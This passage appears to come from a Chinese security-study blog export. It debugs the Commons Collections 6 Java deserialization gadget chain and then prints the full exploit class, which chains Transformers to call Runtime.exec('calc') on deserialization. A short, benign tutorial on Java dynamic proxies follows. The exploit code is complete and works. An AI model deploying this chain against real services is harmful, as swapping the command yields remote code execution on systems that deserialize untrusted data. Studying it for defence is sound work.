![](https://s3.hedgedoc.org/demo/uploads/426c5e82-828d-472d-bb49-bc27461804ef.png)

然后在调用完HashMap.put()方法后，我们需要将能执行命令的Transformer数组对象给封装到ChainedTransformer对象中，这里可以用反射进行更改

![](https://s3.hedgedoc.org/demo/uploads/e609661e-d707-4bee-b587-6e188e11ffb4.png)

但是，还有一个需要改的地方，我们跟进LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/c1deb684-e249-47e2-8a11-7bdcb3383f7e.png)

在调用HashMap.put的时候，成员变量map会被赋值，这里打个断点调试一下

![](https://s3.hedgedoc.org/demo/uploads/ff6459e0-70ce-4042-ac58-a39dedb4564b.png)

如上图所示，因为map在调用HashMap.put的时候并没有赋值，所以进入第58行if的时候，值为false，顺利进入158行的代码逻辑，调用map.put()方法，给map赋值，key和value都是“test”

继续调试，在进入反序列化的时候再次回到了LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/3a8a3672-3b46-4e1b-a19b-6738292bafbd.png)

调试结果如上图所示，此时传入的key是“test”，而map的key也是“test”（第一次进入LazyMap.get()时候赋值），所以在156行的if语句中，map.containsKey(key)的结果是true，所以就直接进入63行的代码，而没有进入if里面触发157行factory.transform()方法

要想进入if里面，就得将map的key给去掉，我们跟进map

![](https://s3.hedgedoc.org/demo/uploads/88f51288-e638-4f7d-92f5-50ecd97d00c2.png)

![](https://s3.hedgedoc.org/demo/uploads/3d860024-6198-4353-ae28-56e516b198e6.png)

可以发现，map来自LazyMap的父类AbstractMapDecorator成员变量map，是个Map对象

所以可以通过Map.clear()或者Map.remove("test");

![](https://s3.hedgedoc.org/demo/uploads/7ca9a1b5-121b-48c0-9f33-3183d2ab5ef3.png)

运行

![](https://s3.hedgedoc.org/demo/uploads/e1179cd2-1e83-4a1d-af58-344728a6ff75.png)

![](https://s3.hedgedoc.org/demo/uploads/eecb6df9-42ca-41b2-9a3f-5c39a1df64c3.png)

成功弹出计算器
## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {

        //Transformer数组对象
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //弄一个不能执行命令的Transformer数组对象，这样在HashMap.put()的时候就不会执行命令
        Transformer[] fackTransformers =  new Transformer[]{};

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(fackTransformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //new一个HashMap对象
        Map map = new HashMap();
        map.put(tiedMapEntry, "aaa");

        //获取LazyMap父类中的map成员变量
        Field field1 = lazyMap.getClass().getSuperclass().getDeclaredField("map");
        field1.setAccessible(true);
        Map map1 = (Map) field1.get(lazyMap);
        //将map的键对清空，即可进入if后面的代码逻辑
        //map1.clear();
        map1.remove("test");

        //获取ChainedTransformer对象中的成员变量iTransformers
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        //将能执行命令的Transformer数组对象给赋值给成员变量iTransformers
        field.set(chainedTransformer, transformers);


        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(map);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409
























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>动态代理</title>
    <url>/2023/08/22/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[# 动态代理
通过java.lang.reflect.Proxy和java.lang.reflect.InvocationHandler即可实现

被代理的那个类必须要先实现java.lang.reflect.InvocationHandler类才行

```
//被代理的类

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class UserInformaiton implements InvocationHandler {

    protected Map map;

    public UserInformaiton(Map map) {
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("不管你执行代理类的哪个方法，都会调用被代理类的invoke()方法");
        return null;
    }
}


```

```
//代理类

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class ProxyTest {
    public static void main(String[] args) {
        Map map = new HashMap();
        InvocationHandler handler = new UserInformaiton(map);
        Map proxyString = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler);

        proxyString.put("name","maniubi");
    }
}


```
效果
![](https://s3.hedgedoc.org/demo/uploads/233bd94d-9b44-4839-9122-e7fcc3d4af7d.png)
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>零碎知识</tag>
      </tags>
  </entry>
</search>
